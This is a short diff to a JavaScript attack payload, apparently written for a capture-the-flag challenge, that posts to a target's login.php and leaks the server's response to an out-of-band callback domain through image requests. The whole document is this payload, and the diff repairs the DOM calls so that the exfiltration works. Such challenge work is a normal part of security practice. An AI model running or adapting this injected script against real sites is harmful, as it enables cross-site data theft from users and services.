@@ -1,7 +1,9 @@
 <script language="JavaScript" type="text/javascript" >
 var url = "http://eci-2zedy98vjilt5hdsdipy.cloudeci1.ichunqiu.com/login.php";
 var httpRequest = new XMLHttpRequest();
-document.appendChild("<img src='http://my58ld.ceye.io/1111'>")
+const node = document.createElement("img");
+node.setAttribute("src","http://my58ld.ceye.io/1111")
+document.appendChild(node)
 httpRequest.open('POST', url, true);
 httpRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 var obj = {
@@ -16,7 +18,9 @@ httpRequest.send(JSON.stringify(obj));
 httpRequest.onreadystatechange = function () {
     if (httpRequest.readyState == 4 && httpRequest.status == 200) {
         var json = httpRequest.responseText;
-        document.appendChild("<img src='http://my58ld.ceye.io/"+json+"'>")
+        const node = document.createElement("img");
+        node.setAttribute("src","http://my58ld.ceye.io/"+json)
+        document.appendChild(node)
     }
 };
 </script>
